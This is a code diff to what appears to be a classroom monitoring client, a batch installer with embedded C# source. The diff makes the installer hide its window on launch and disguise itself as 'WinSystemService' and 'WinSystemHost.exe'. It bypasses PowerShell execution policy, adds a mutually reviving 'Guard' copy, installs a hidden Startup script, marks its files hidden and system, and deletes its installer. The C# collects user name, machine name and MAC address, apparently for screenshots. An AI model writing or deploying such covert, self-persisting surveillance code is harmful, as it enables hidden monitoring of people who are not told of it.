@@ -782,10 +782,13 @@ BAT_CONTENT = r"""@echo off
 chcp 65001 >nul
 set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
+attrib -h -s "%INSTALL_DIR%" >nul 2>&1
+attrib -h -s "%INSTALL_DIR%\*" >nul 2>&1
 
 :: Kullanici cift tikladigi anda siyah pencereyi 0.05 saniyede kapatip tamamen gorunmez (WindowStyle=0) moda gec
 if not "%~1"=="--silent" (
     attrib -h -s "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
+    attrib -h -s "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
     copy /y "%~f0" "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
     (
         echo Set WshShell = CreateObject^("WScript.Shell"^)
@@ -806,35 +809,43 @@ del /f /q "%USERPROFILE%\Desktop\ogrenci-istemci*.bat" >nul 2>&1
 del /f /q "%USERPROFILE%\Desktop\SistemServisi*.bat" >nul 2>&1
 del /f /q "%USERPROFILE%\Desktop\WinSystemSetup*.bat" >nul 2>&1
 
-:: Eski surecleri temizle
-taskkill /f /im WinSystemHost.exe >nul 2>&1
-taskkill /f /im WinSystemGuard.exe >nul 2>&1
-taskkill /f /im PiriReisLabHost.exe >nul 2>&1
-taskkill /f /im PiriReisLabGuard.exe >nul 2>&1
-taskkill /f /im WindowsAudioHost.exe >nul 2>&1
-
-set "OLD_DIR=%LOCALAPPDATA%\PiriReisLabService"
-if exist "%OLD_DIR%" rd /s /q "%OLD_DIR%" >nul 2>&1
-
 set "CS_FILE=%INSTALL_DIR%\WinHost.cs"
 set "EXE_FILE=%INSTALL_DIR%\WinSystemHost.exe"
 set "GUARD_FILE=%INSTALL_DIR%\WinSystemGuard.exe"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "VBS_STARTUP=%STARTUP_DIR%\WinSystemService.vbs"
 
+:: Eski cift nobetci sureclerini AYNI ANDA kesin olarak sonlandir (birbirini diriltmesini onle)
+taskkill /f /im WinSystemHost.exe /im WinSystemGuard.exe /im PiriReisLabHost.exe /im PiriReisLabGuard.exe /im WindowsAudioHost.exe >nul 2>&1
+ping 127.0.0.1 -n 2 >nul
+taskkill /f /im WinSystemHost.exe /im WinSystemGuard.exe >nul 2>&1
+
+set "OLD_DIR=%LOCALAPPDATA%\PiriReisLabService"
+if exist "%OLD_DIR%" rd /s /q "%OLD_DIR%" >nul 2>&1
+
 del /f /q "%STARTUP_DIR%\PiriReisLabAgent.vbs" >nul 2>&1
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PiriReisLabService" /f >nul 2>&1
 schtasks /delete /tn "PiriReisLabAgent" /f >nul 2>&1
 
-:: C# Kaynak Kodunu Cikar (76. satirdan itibaren)
-more +76 "%~f0" > "%CS_FILE%"
+:: Eski exe kilitliyse bile yeni derleme icin yolu ac
+attrib -h -s "%EXE_FILE%" >nul 2>&1
+attrib -h -s "%GUARD_FILE%" >nul 2>&1
+del /f /q "%EXE_FILE%" >nul 2>&1
+del /f /q "%GUARD_FILE%" >nul 2>&1
+del /f /q "%INSTALL_DIR%\*.old.*" >nul 2>&1
+if exist "%EXE_FILE%" move /y "%EXE_FILE%" "%EXE_FILE%.old.%RANDOM%" >nul 2>&1
+if exist "%GUARD_FILE%" move /y "%GUARD_FILE%" "%GUARD_FILE%.old.%RANDOM%" >nul 2>&1
+
+:: C# Kaynak Kodunu Guvenli Sekilde Cikar (PowerShell + fallback)
+del /f /q "%CS_FILE%" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$lines = Get-Content -LiteralPath '%~f0' -Encoding UTF8; $idx = [Array]::IndexOf($lines, '// ===CSHARP_START==='); if ($idx -ge 0) { $lines[($idx+1)..($lines.Length-1)] | Set-Content -LiteralPath '%CS_FILE%' -Encoding UTF8 }" >nul 2>&1
+if not exist "%CS_FILE%" more +89 "%~f0" > "%CS_FILE%"
 
 set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 if not exist "%CSC_EXE%" set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
 
-attrib -h -s "%EXE_FILE%" >nul 2>&1
-attrib -h -s "%GUARD_FILE%" >nul 2>&1
 "%CSC_EXE%" /nologo /target:winexe /out:"%EXE_FILE%" /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll "%CS_FILE%" >nul 2>&1
+if exist "%EXE_FILE%" copy /y "%EXE_FILE%" "%GUARD_FILE%" >nul 2>&1
 
 attrib -h -s "%VBS_STARTUP%" >nul 2>&1
 (
@@ -849,11 +860,13 @@ del /f /q "%CS_FILE%" >nul 2>&1
 del /f /q "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
 attrib +h "%VBS_STARTUP%" >nul 2>&1
 attrib +h +s "%EXE_FILE%" >nul 2>&1
+attrib +h +s "%GUARD_FILE%" >nul 2>&1
 attrib +h +s "%INSTALL_DIR%" >nul 2>&1
 
 start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
 del /f /q "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
 exit /b 0
+// ===CSHARP_START===
 using System;
 using System.IO;
 using System.Net;
@@ -926,8 +939,14 @@ namespace WinSystemService
 
             deskNo = Environment.MachineName;
             studentName = Environment.UserName;
-            clientId = "pc-" + deskNo;
             DetectNetworkInfo();
+            string macSuffix = "";
+            if (!string.IsNullOrEmpty(localMac))
+            {
+                string cleanMac = localMac.Replace("-", "").Replace(":", "").Trim();
+                if (cleanMac.Length >= 4) macSuffix = "-" + cleanMac.Substring(cleanMac.Length - 4);
+            }
+            clientId = "pc-" + deskNo + macSuffix;
 
             foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageEncoders())
             {
